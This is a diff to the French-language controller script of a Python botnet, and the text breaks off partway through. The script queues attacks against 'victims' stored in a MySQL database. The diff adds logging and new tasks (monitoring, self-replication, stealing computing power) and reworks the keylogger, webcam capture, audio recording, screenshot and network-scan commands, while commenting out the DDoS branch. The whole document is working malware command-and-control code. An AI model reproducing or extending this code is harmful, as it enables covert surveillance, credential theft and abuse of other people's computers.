@@ -7,6 +7,7 @@ import select
 import threading
 import rsa
 import base64
+import logging
 
 from env import *
 from server import *
@@ -34,6 +35,14 @@ from datetime import datetime
 # python3 main.py -h 10.10.10.10 -a shell
 # python3 main.py -cg ESGI 100.100.100.100,13.13.13.13
 
+# Initialisation du logger
+logging.basicConfig(level=logging.INFO,
+                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+                    handlers=[logging.FileHandler("botnet.log"),
+                              logging.StreamHandler()])
+
+logger = logging.getLogger("botnet")
+
 parser = argparse.ArgumentParser()
 
 # Groupe mutuellement exclusif pour les attaques
@@ -49,7 +58,13 @@ action_group.add_argument("--ddos", action="store_true", help="lance une attaque
 action_group.add_argument("--crack", action="store_true", help="lance une attaque de crack sur un ordinateur")
 
 # Arguments spécifiques à l'attaque de screenshot
-action_group.add_argument("--screenshot", action="store_true", help="lance une capture d'écran sur un ordinateur")
+action_group.add_argument("--screenshot", action="store_true", help="lance une capture des fenetres sur un ordinateur")
+
+# Arguments spécifiques à l'attaque de monitor
+action_group.add_argument("--monitor", action="store_true", help="lance une capture d'écran sur un ordinateur")
+
+# Arguments spécifiques à l'attaque d'autoréplication
+action_group.add_argument("--autorep", action="store_true", help="lance une l'autoréplication sur un ordinateur")
 
 # Arguments spécifiques à l'attaque de picture
 action_group.add_argument("--picture", action="store_true", help="lance une capture de la webcam d'un ordinateur")
@@ -60,28 +75,18 @@ action_group.add_argument("--record", action="store_true", help="lance un enregi
 # Arguments spécifiques à l'attaque de keylogger
 action_group.add_argument("--keylogger", action="store_true", help="lance un keylogger sur un ordinateur")
 
+# Arguments spécifiques à l'attaque force de calcul
+action_group.add_argument("--calcul", action="store_true", help="lance une attaque de force de calcul sur un ordinateur")
+
+
 # SQL request
-action_group.add_argument("--showall", action="store_true", help="Récupre toutes les informations d'une table donnée")
+action_group.add_argument("--showall", action="store_true", help="Récupère toutes les informations d'une table donnée")
 parser.add_argument("--target", type=str, help="table à afficher")
 parser.add_argument("--param", type=str, help="condition de la requête")
 parser.add_argument("--value", type=str, help="valeur de la condition")
 
-# # Lance un shell sur une machine précise
-# action_group.add_argument("--shell", action="store_true", help="Lance un shell sur une machine précise")
-
-# # Lance un VPN sur une machine précise
-# action_group.add_argument("--endpoint", action="store_true", help="Lance une connexion VPN sur une machine précise")
-
 # Lance un VPN sur une machine précise
 action_group.add_argument("--scan", action="store_true", help="Scan le réseau d'une machine précise ou d'un groupe")
-
-# # Active/désactive le mode discretion
-# action_group.add_argument("--stealth", action="store_true",  help="Active le mode discretion sur une ou plusieurs machines. Limite l'utilisation de l'ordinateur")
-# action_group.add_argument("--no-stealth", action="store_true",  help="Désactive le mode discretion sur une ou plusieurs machines. Enlève la limite d'utilisation de l'ordinateur")
-
-# # Active/désactive le mode multi-task
-# action_group.add_argument("--multi-task", action="store_true",  help="Active le mode multi-task sur une ou plusieurs machines. Permet de lancer plusieurs taches en même temps")
-# action_group.add_argument("--no-multi-task", action="store_true",  help="Désactive le mode multi-task sur une ou plusieurs machines. Limite les taches à une seule à la fois")
 
 # Arguments pour les différentes attaques
 parser.add_argument("--port", type=int, help="démarre le serveur sur le port suivant")
@@ -92,7 +97,6 @@ parser.add_argument("--address", type=str, help="adresse ip de l'ordinateur à a
 parser.add_argument("--time", type=int, help="temps de l'attaque (ddos/keylogger) en seconde")
 parser.add_argument("--hash", type=str, help="hash à cracker")
 parser.add_argument("--wordlist", type=str, help="wordlist")
-
 
 # Gestion des groupes
 action_group.add_argument("--list-host", action="store_true", help="Montre la liste des ordinateurs")
@@ -122,54 +126,49 @@ db = mysql.connector.connect(
 mycursor = db.cursor()
 
 
-if args.ddos:
-    if not args.address or not args.time:
-        parser.error("--ddos nécessite les arguments --address et --time")
+# if args.ddos:
+#     if not args.address or not args.time or not args.port:
+#         logger.error("--ddos nécessite les arguments --address, --time et --port")
+#         parser.error("--ddos nécessite les arguments --address, --time et --port")
 
-    elif not args.host and not args.group:
-        parser.error("--ddos ne peut prendre en compte que l'argument --group. Veuillez vous référer à l'aide")
+#     elif not args.host:
+#         logger.error("--ddos nécessite l'argument --host")
+#         parser.error("--ddos nécessite l'argument --host")
+#     elif args.host:
+#         try:
+#             for victim in args.host.split(","):
+#                 query = "SELECT id FROM victims WHERE uid = %s"
+#                 values = (victim, )
+#                 mycursor.execute(query, values)
 
-    elif args.host and args.group:
-        parser.error("--ddos ne peut prendre en compte que l'argument --group. Veuillez vous référer à l'aide")
-    
-    elif args.host:
-        parser.error("--ddos ne peut prendre en compte que l'argument --group. Veuillez vous référer à l'aide")
+#                 result = mycursor.fetchall()
+#                 for id in result:
+#                     query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+#                     values = (id[0], "ddos", "pending", "{\"arg1\": \"" + str(args.address) + "\", \"arg2\": \"" + str(args.port) + "\", \"arg3\":  \"" + str(args.time) + "\"}")
+#                     mycursor.execute(query, values)
+#             logger.info("attack:ddos, address:" + args.address + ", port:" + str(args.port) + ", time:" + str(args.time) + ", host:"+ args.host)
+#         except mysql.connector.ProgrammingError as e:
+#             logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque ddos dans la base de données")
+#         except mysql.connector.Error as e:
+#             logger.error("Erreur lors de l'insertion de l'attaque ddos dans la base de données")
 
-    elif args.group:
+#     else:
+#         parser.error("mauvaise utilisation de --ddos. Veuillez vous référer à l'aide")
 
-        print("ddos sur " + args.address + " pendant " + str(args.time) + " secondes avec le(s) groupe(s) " + args.group)
-    
-        for group in args.group.split(","):
-            query = "SELECT id FROM groups WHERE name = %s"
-            values = (group, )
-            mycursor.execute(query, values)
-
-            result = mycursor.fetchall()
-
-            for id in result:
-                query = "INSERT INTO group_attacks (group_id, type, state, executed_rate, text, created_at, updated_at) VALUES (%s, %s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
-                values = (id[0], 
-                          "ddos", 
-                          "pending", 
-                          "0",
-                          "{\"ip\": \"" + args.address + "\", \"time\": \"" + str(args.time) + "\"}")
-
-                mycursor.execute(query, values)
-
-    else:
-        parser.error("mauvaise utilisation de --ddos. Veuillez vous référer à l'aide")
-
-
+# arg 1 : ip # arg2 : port # arg3 : time  
 ############################################################
 
 
-elif args.crack:
+if args.crack:
     if not args.hash or not args.wordlist:
+        logger.error("--crack nécessite les arguments --hash et --wordlist")
         parser.error("--crack nécessite les arguments --hash et --wordlist")
     elif not args.host and not args.group:
+        logger.error("--crack nécessite l'argument --host et/ou --group")
         parser.error("--crack nécessite l'argument --host et/ou --group")
 
-    print("crack du hash '" + args.hash + "' avec la wordlist " + args.wordlist)
+    logger.info("attack:crack, hash:" + str(args.hash) + ", wordlist:" + str(args.wordlist))
+    print("crack du hash '" + str(args.hash) + "' avec la wordlist " + str(args.wordlist))
 
 
 ############################################################
@@ -177,101 +176,170 @@ elif args.crack:
 
 elif args.keylogger:
     if not args.time :
+        logger.error("--keylogger nécessite l'argument --time")
         parser.error("--keylogger nécessite l'argument --time")
     elif not args.host:
+        logger.error("--keylogger nécessite l'argument --host")
         parser.error("--keylogger nécessite l'argument --host")
 
-    print("keylogger lancé pour une durée de " + str(args.time) + " secondes sur " + args.host)
-
-    for victim in args.host.split(","):
-        query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
-        values = (victim, victim, victim, )
-        mycursor.execute(query, values)
-
-        result = mycursor.fetchall()
-
-        for id in result:
-            query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
-            values = (id[0], "keylogger", "pending", "{\"arg1\": \"" + str(args.time) + "\", \"arg2\": \"\", \"arg3\": \"\"}")
-
+    try: 
+        for victim in args.host.split(","):
+            query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
+            values = (victim, victim, victim, )
             mycursor.execute(query, values)
 
+            result = mycursor.fetchall()
+
+            for id in result:
+                query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+                values = (id[0], "keylogger", "pending", "{\"arg1\": \"" + str(args.time) + "\", \"arg2\": \"\", \"arg3\": \"\"}")
+
+                mycursor.execute(query, values)
+        print("keylogger lancé pour une durée de " + str(args.time) + " secondes sur " + str(args.host))
+        logger.info("attack:keylogger, time:" + str(args.time) + ", host:"+ str(args.host))
+    except mysql.connector.ProgrammingError as e:
+        logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque keylogger dans la base de données")
+    except mysql.connector.Error as e:
+        logger.error("Erreur lors de l'insertion de l'attaque keylogger dans la base de données")
+
+
+############################################################
+
+elif args.autorep:
+    if not args.host : 
+        logger.error("--autorep nécessite l'argument --host")
+        parser.error("--autorep nécessite l'argument --host")
+
+    try:
+        for victim in args.host.split(","):
+            query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
+            values = (victim, victim, victim, )
+            mycursor.execute(query, values)
+
+            result = mycursor.fetchall()
+
+            for id in result:
+                query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+                values = (id[0], "autorep", "pending", "{\"arg1\": \"\", \"arg2\": \"\", \"arg3\": \"\"}")
+
+                mycursor.execute(query, values)
+        print("autorep lancé sur " + args.host)
+        logger.info("attack:autorep, host:"+ args.host)
+    except mysql.connector.ProgrammingError as e:
+        logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque autoréplication dans la base de données")
+    except mysql.connector.Error as e:
+        logger.error("Erreur lors de l'insertion de l'attaque autoréplication dans la base de données")
 
 ############################################################
 
 elif args.screenshot:
     if not args.host : 
+        logger.error("--screenshot nécessite l'argument --host")
         parser.error("--screenshot nécessite l'argument --host")
 
-    print("screenshot lancé sur " + args.host)
-
-    for victim in args.host.split(","):
-        query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
-        values = (victim, victim, victim, )
-        mycursor.execute(query, values)
-
-        result = mycursor.fetchall()
-
-        for id in result:
-            query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
-            values = (id[0], "screenshot", "pending", "{\"arg1\": \"\", \"arg2\": \"\", \"arg3\": \"\"}")
-
+    try:
+        for victim in args.host.split(","):
+            query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
+            values = (victim, victim, victim, )
             mycursor.execute(query, values)
+
+            result = mycursor.fetchall()
+
+            for id in result:
+                query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+                values = (id[0], "screenshot", "pending", "{\"arg1\": \"\", \"arg2\": \"\", \"arg3\": \"\"}")
+
+                mycursor.execute(query, values)
+        print("screenshot lancé sur " + args.host)
+        logger.info("attack:screenshot, host:"+ args.host)
+    except mysql.connector.ProgrammingError as e:
+        logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque screenshot dans la base de données")
+    except mysql.connector.Error as e:
+        logger.error("Erreur lors de l'insertion de l'attaque screenshot dans la base de données")
+
+############################################################
+
+elif args.monitor:
+    if not args.host : 
+        logger.error("--monitor nécessite l'argument --host")
+        parser.error("--monitor nécessite l'argument --host")
+
+    try:
+        for victim in args.host.split(","):
+            query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
+            values = (victim, victim, victim, )
+            mycursor.execute(query, values)
+
+            result = mycursor.fetchall()
+
+            for id in result:
+                query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+                values = (id[0], "monitor", "pending", "{\"arg1\": \"\", \"arg2\": \"\", \"arg3\": \"\"}")
+
+                mycursor.execute(query, values)
+        print("monitor lancé sur " + args.host)
+        logger.info("attack:monitor, host:"+ args.host)
+    except mysql.connector.ProgrammingError as e:
+        logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque monitor dans la base de données")
+    except mysql.connector.Error as e:
+        logger.error("Erreur lors de l'insertion de l'attaque monitor dans la base de données")
 
 ############################################################
 
 elif args.record:
     if not args.host : 
+        logger.error("--record nécessite l'argument --host")
         parser.error("--record nécessite l'argument --host")
     elif not args.time:
+        logger.error("--record nécessite l'argument --time")
         parser.error("--record nécessite l'argument --time")
 
-    print("record lancé pour une durée de " + str(args.time) + " secondes sur " + args.host)
-
-    for victim in args.host.split(","):
-        query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
-        values = (victim, victim, victim, )
-        mycursor.execute(query, values)
-
-        result = mycursor.fetchall()
-
-        for id in result:
-            query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
-            values = (id[0], "record", "pending", "{\"arg1\": \"--time " + str(args.time) + "\", \"arg2\": \"\", \"arg3\": \"\"}")
-
+    try:
+        for victim in args.host.split(","):
+            query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
+            values = (victim, victim, victim, )
             mycursor.execute(query, values)
+
+            result = mycursor.fetchall()
+
+            for id in result:
+                query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+                values = (id[0], "record", "pending", "{\"arg1\": \"--time " + str(args.time) + "\", \"arg2\": \"\", \"arg3\": \"\"}")
+
+                mycursor.execute(query, values)
+        print("record lancé pour une durée de " + str(args.time) + " secondes sur " + str(args.host))
+        logger.info("attack:record, time:" + str(args.time) + ", host:"+ str(args.host))
+    except mysql.connector.ProgrammingError as e:
+        logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque record dans la base de données")
+    except mysql.connector.Error as e:
+        logger.error("Erreur lors de l'insertion de l'attaque record dans la base de données")
 
 ############################################################
 
 elif args.picture:
     if not args.host : 
+        logger.error("--picture nécessite l'argument --host")
         parser.error("--picture nécessite l'argument --host")
-
-    print("picture lancé sur " + args.host)
-
-    for victim in args.host.split(","):
-        query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
-        values = (victim, victim, victim, )
-        mycursor.execute(query, values)
-
-        result = mycursor.fetchall()
-
-        for id in result:
-            query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
-            values = (id[0], "picture", "pending", "{\"arg1\": \"\", \"arg2\": \"\", \"arg3\": \"\"}")
-
+    
+    try:
+        for victim in args.host.split(","):
+            query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
+            values = (victim, victim, victim, )
             mycursor.execute(query, values)
 
+            result = mycursor.fetchall()
 
-############################################################
+            for id in result:
+                query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+                values = (id[0], "picture", "pending", "{\"arg1\": \"\", \"arg2\": \"\", \"arg3\": \"\"}")
 
-
-# elif args.shell:
-#     if args.group:
-#         parser.error("--shell n'accepte pas l'argument --group")
-#     elif not args.host:
-#         parser.error("--shell nécessite l'argument --host")
-#     print("shell sur " + args.host)
+                mycursor.execute(query, values)
+        print("picture lancé sur " + args.host)
+        logger.info("attack:picture, host:"+ args.host)
+    except mysql.connector.ProgrammingError as e:
+        logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque picture dans la base de données")
+    except mysql.connector.Error as e:
+        logger.error("Erreur lors de l'insertion de l'attaque picture dans la base de données")
 
 
 ############################################################
@@ -310,224 +378,59 @@ elif args.showall:
 
 ############################################################
 
-
-# elif args.endpoint:
-#     if args.group:
-#         parser.error("--endpoint n'accepte pas l'argument --group")
-#     elif not args.host:
-#         parser.error("--endpoint nécessite l'argument --host")
-#     print("connexion VPN sur " + args.host)
-
-
-############################################################
-
-
 elif args.scan:
     if not args.host and not args.group:
+        logger.error("--scan nécessite l'argument --host et/ou --group")
         parser.error("--scan nécessite l'argument --host ou --group")
 
 
     elif args.host and args.group:
+        logger.error("--scan nécessite l'argument --host ou --group")
         parser.error("--scan nécessite l'argument --host ou --group. Veuillez vous référer à l'aide")
 
         
     elif args.host:
-        print("lancement du scan sur " + args.host)
-    
-        for victim in args.host.split(","):
-            query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
-            values = (victim, victim, victim, )
-            mycursor.execute(query, values)
-
-            result = mycursor.fetchall()
-
-            for id in result:
-
-                query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
-
-                if args.address:
-                    if not args.port_scan and not args.port_start and not args.port_end:
-                        values = (id[0], "scan", "pending", "{\"arg1\": \"--ip " + str(args.address) + "\", \"arg2\": \"\", \"arg3\": \"\"}")
-                    
-                    elif args.port_scan:
-                        values = (id[0], "scan", "pending", "{\"arg1\": \"--ip " + str(args.address) + "\", \"arg2\": \"--port1 " + str(args.port_scan) + "\", \"arg3\": \"\"}")
-                    
-                    elif args.port_start and args.port_end :
-                        values = (id[0], "scan", "pending", "{\"arg1\": \"--ip " + str(args.address) + "\", \"arg2\": \"--port1 " + str(args.port_start) + "\", \"arg3\": \"--port2 " + str(args.port_end) + "\"}")
-
-                    else:
-                        parser.error("mauvaise utilisation de --scan. Veuillez n'utiliser que '--port_scan' ou '--port_start et --port_end'")
-                else:
-                    values = (id[0], "scan", "pending", "{\"arg1\": \"\", \"arg2\": \"\", \"arg3\": \"\"}")
-
+        
+        try:
+            for victim in args.host.split(","):
+                query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
+                values = (victim, victim, victim, )
                 mycursor.execute(query, values)
-    
-    # elif args.group:
-    #     print("lancement du scan sur " + args.group)
-    
-    #     for group in args.group.split(","):
-    #         query = "SELECT id FROM victims WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
-    #         values = (group, )
-    #         mycursor.execute(query, values)
 
-    #         result = mycursor.fetchall()
+                result = mycursor.fetchall()
 
-    #         for id in result:
-    #             query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
-    #             values = (id[0], "scan", "pending", "test")
+                for id in result:
 
-    #             mycursor.execute(query, values)
+                    query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+
+                    if args.address:
+                        if not args.port_scan and not args.port_start and not args.port_end:
+                            values = (id[0], "scan", "pending", "{\"arg1\": \"--ip " + str(args.address) + "\", \"arg2\": \"\", \"arg3\": \"\"}")
+                        
+                        elif args.port_scan:
+                            values = (id[0], "scan", "pending", "{\"arg1\": \"--ip " + str(args.address) + "\", \"arg2\": \"--port1 " + str(args.port_scan) + "\", \"arg3\": \"\"}")
+                        
+                        elif args.port_start and args.port_end :
+                            values = (id[0], "scan", "pending", "{\"arg1\": \"--ip " + str(args.address) + "\", \"arg2\": \"--port1 " + str(args.port_start) + "\", \"arg3\": \"--port2 " + str(args.port_end) + "\"}")
+
+                        else:
+                            parser.error("mauvaise utilisation de --scan. Veuillez n'utiliser que '--port_scan' ou '--port_start et --port_end'")
+                    else:
+                        values = (id[0], "scan", "pending", "{\"arg1\": \"\", \"arg2\": \"\", \"arg3\": \"\"}")
+
+                    mycursor.execute(query, values)
+            print("lancement du scan sur " + args.host)
+            logger.info("attack:scan, host:"+ args.host + ", port_scan:" + str(args.port_scan) + ", port_start:" + str(args.port_start) + ", port_end:" + str(args.port_end))
+        except mysql.connector.ProgrammingError as e:
+            logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque scan dans la base de données")
+        except mysql.connector.Error as e:
+            logger.error("Erreur lors de l'insertion de l'attaque scan dans la base de données")
 
     else:
         parser.error("mauvaise utilisation de --scan. Veuillez vous référer à l'aide")
 
 
 ############################################################
-
-
-# elif args.stealth:
-#     if not args.host and not args.group:
-#         parser.error("--stealth nécessite l'argument --host et/ou --group")
-
-#     elif args.host and args.group:
-#         parser.error("--stealth nécessite l'argument --host ou --group. Veuillez vous référer à l'aide")
-
-#     elif args.no_stealth:
-#         parser.error("--stealth et --no-stealth sont mutuellement exclusifs")
-        
-#     elif args.host:
-#         print("activation du mode stealth sur " + args.host)
-
-#         query = "UPDATE victims SET stealth = 1, updated = 1 WHERE id = %s OR uid = %s"
-
-#         for victim in args.host.split(","):
-#             values = (victim, victim, victim)
-#             mycursor.execute(query, values)
-
-    
-#     elif args.group:
-#         print("activation du mode stealth sur " + args.group)
-
-#         query = "UPDATE victims SET stealth = 1, updated = 1 WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
-
-#         for group in args.group.split(","):
-#             values = (group, )
-#             mycursor.execute(query, values)
-
-#     else:
-#         parser.error("mauvaise utilisation de --stealth. Veuillez vous référer à l'aide")
-
-
-# ############################################################
-
-
-# elif args.no_stealth:
-#     if not args.host and not args.group:
-#         parser.error("--no-stealth nécessite l'argument --host et/ou --group")
-
-#     elif args.host and args.group:
-#         parser.error("--no-stealth nécessite l'argument --host ou --group. Veuillez vous référer à l'aide")
-
-#     elif args.stealth:
-#         parser.error("--no-stealth et --stealth sont mutuellement exclusifs")
-        
-#     elif args.host:
-#         print("désactivation du mode stealth sur " + args.host)
-
-#         query = "UPDATE victims SET stealth = 0, updated = 1 WHERE id = %s OR uid = %s"
-
-#         for victim in args.host.split(","):
-#             values = (victim, victim, victim)
-#             mycursor.execute(query, values)
-
-    
-#     elif args.group:
-#         print("désactivation du mode stealth sur " + args.group)
-
-#         query = "UPDATE victims SET stealth = 0, updated = 1 WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
-
-#         for group in args.group.split(","):
-#             values = (group, )
-#             mycursor.execute(query, values)
-
-#     else:
-#         parser.error("mauvaise utilisation de --no-stealth. Veuillez vous référer à l'aide")
-
-
-############################################################
-
-
-# elif args.multi_task:
-#     if not args.host and not args.group:
-#         parser.error("--multi-task nécessite l'argument --host et/ou --group")
-
-#     elif args.host and args.group:
-#         parser.error("--multi-task nécessite l'argument --host ou --group. Veuillez vous référer à l'aide")
-
-#     elif args.no_multi_task:
-#         parser.error("--multi-task et --no-multi-task sont mutuellement exclusifs")
-        
-#     elif args.host:
-#         print("activation du mode multi-task sur " + args.host)
-
-#         query = "UPDATE victims SET multi_thread = 1, updated = 1 WHERE id = %s OR uid = %s"
-
-#         for victim in args.host.split(","):
-#             values = (victim, victim, victim)
-#             mycursor.execute(query, values)
-
-    
-#     elif args.group:
-#         print("activation du mode multi-task sur " + args.group)
-
-#         query = "UPDATE victims SET multi_thread = 1, updated = 1 WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
-
-#         for group in args.group.split(","):
-#             values = (group, )
-#             mycursor.execute(query, values)
-
-#     else:
-#         parser.error("mauvaise utilisation de --multi-task. Veuillez vous référer à l'aide")
-
-
-############################################################
-
-
-# elif args.no_multi_task:
-#     if not args.host and not args.group:
-#         parser.error("--no-multi-task nécessite l'argument --host ou --group")
-
-#     elif args.host and args.group:
-#         parser.error("--no-multi-task nécessite l'argument --host ou --group. Veuillez vous référer à l'aide")
-
-#     elif args.multi_task:
-#         parser.error("--no-multi-task et --multi-task sont mutuellement exclusifs")
-        
-#     elif args.host:
-#         print("désactivation du mode multi-task sur " + args.host)
-
-#         query = "UPDATE victims SET multi_thread = 0, updated = 1 WHERE id = %s OR uid = %s"
-
-#         for victim in args.host.split(","):
-#             values = (victim, victim, victim)
-#             mycursor.execute(query, values)
-
-    
-#     elif args.group:
-#         print("désactivation du mode multi-task sur " + args.group)
-
-#         query = "UPDATE victims SET multi_thread = 0, updated = 1 WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
-
-#         for group in args.group.split(","):
-#             values = (group, )
-#             mycursor.execute(query, values)
-
-#     else:
-#         parser.error("mauvaise utilisation de --no-multi-task. Veuillez vous référer à l'aide")
-
-
-############################################################
-
 
 elif args.list_host:
     if args.host:
@@ -609,64 +512,72 @@ elif args.list_group:
 
 elif args.create_group:
     if args.host or args.group:
+        logger.error("--create-group n'accepte pas les arguments --host et --group")
         parser.error("--create-group n'accepte pas les arguments --host et --group")
 
     else:
 
         if len(args.create_group) > 2:
+            logger.error("--create-group n'accepte que 2 arguments")
             parser.error("--create-group n'accepte que 2 arguments")
-
-        # Création du groupe
-        print("création du groupe " + args.create_group[0])
 
         group_name = args.create_group[0]
 
 
         if not group_name.isalnum():
+            logger.error("Le nom du groupe ne doit contenir que des caractères alphanumériques, group_name: " + str(group_name))
             print("Le nom du groupe ne doit contenir que des caractères alphanumériques")
             exit(1)
 
 
         # Vérification de l'existence du groupe
         if group_exists(group_name):
+            logger.error("Le groupe existe déjà, group_name: " + str(group_name))
             print("Le groupe existe déjà")
             exit(1)
 
+        try:
+            # Création du groupe
+            query = "INSERT INTO groups (name, image, created_at, updated_at) VALUES (%s, 'default.png', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+            values = (group_name, )
 
-        # Création du groupe
-        query = "INSERT INTO groups (name, image, created_at, updated_at) VALUES (%s, 'default.png', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
-        values = (group_name, )
+            mycursor.execute(query, values)
 
-        mycursor.execute(query, values)
+            # Récupération des ordinateurs à ajouter au groupe
+            if len(args.create_group) == 2:
+                victims_list = []
 
-        # Récupération des ordinateurs à ajouter au groupe
-        if len(args.create_group) == 2:
-            victims_list = []
+                for victim in args.create_group[1].split(","):
+                    query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
+                    values = (victim, victim, victim)
 
-            for victim in args.create_group[1].split(","):
-                query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
-                values = (victim, victim, victim)
+                    mycursor.execute(query, values)
+                    result = mycursor.fetchall()
 
-                mycursor.execute(query, values)
-                result = mycursor.fetchall()
+                    if len(result) == 0:
+                        logger.error("L'ordinateur '" + victim + "' n'existe pas")
+                        print("L'ordinateur '" + victim + "' n'existe pas")
 
-                if len(result) == 0:
-                    print("L'ordinateur '" + victim + "' n'existe pas")
-
-                for id in result:
-                    victims_list.append(id[0])
-
-
-            # Ajout des ordinateurs au groupe
-            for victim_id in victims_list:
-                query = "INSERT INTO victim_groups (group_id, victim_id, created_at, updated_at) VALUES ((SELECT id FROM groups WHERE name = %s), %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
-                values = (group_name, victim_id)
-
-                mycursor.execute(query, values)
+                    for id in result:
+                        victims_list.append(id[0])
 
 
-        else:
-            print("Le groupe a été créé sans ordinateur")
+                # Ajout des ordinateurs au groupe
+                for victim_id in victims_list:
+                    query = "INSERT INTO victim_groups (group_id, victim_id, created_at, updated_at) VALUES ((SELECT id FROM groups WHERE name = %s), %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+                    values = (group_name, victim_id)
+
+                    mycursor.execute(query, values)
+            else:
+                logger.info("Le groupe a été créé sans ordinateur")
+                print("Le groupe a été créé sans ordinateur")
+            # Création du groupe
+            print("création du groupe " + args.create_group[0])
+            logger.info("Création du groupe :" + args.create_group[0])
+        except mysql.connector.ProgrammingError as e:
+            logger.error("Erreur de syntaxe SQL lors de la création du groupe dans la base de données")
+        except mysql.connector.Error as e:
+            logger.error("Erreur lors de la création du groupe dans la base de données")
 
 
 ############################################################
@@ -674,42 +585,55 @@ elif args.create_group:
 
 elif args.add_to_group:
     if args.host or args.group:
+        logger.error("--add-to-group n'accepte pas les arguments --host et --group")
         parser.error("--add-to-group n'accepte pas les arguments --host et --group")
 
     else:
-        print("ajout des ordinateurs " + args.add_to_group[1] + " au groupe " + args.add_to_group[0])
+        
 
         group_name = args.add_to_group[0]
 
         # Vérification de l'existence du groupe
         if not group_exists(group_name):
+            logger.error("Le groupe n'existe pas : " + group_name)
             print("Le groupe n'existe pas")
             exit(1)
 
         else:
-            # Récupération des ordinateurs à ajouter au groupe
-            victims_list = []
 
-            for victim in args.add_to_group[1].split(","):
-                query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
-                values = (victim, victim, victim)
+            try:
+                # Récupération des ordinateurs à ajouter au groupe
+                victims_list = []
 
-                mycursor.execute(query, values)
-                result = mycursor.fetchall()
+                for victim in args.add_to_group[1].split(","):
+                    query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
+                    values = (victim, victim, victim)
 
-                if len(result) == 0:
-                    print("L'ordinateur '" + victim + "' n'existe pas")
+                    mycursor.execute(query, values)
+                    result = mycursor.fetchall()
 
-                for id in result:
-                    victims_list.append(id[0])
+                    if len(result) == 0:
+                        logger.error("L'ordinateur '" + victim + "' n'existe pas")
+                        print("L'ordinateur '" + victim + "' n'existe pas")
+
+                    for id in result:
+                        victims_list.append(id[0])
 
 
-            # Ajout des ordinateurs au groupe
-            for victim_id in victims_list:
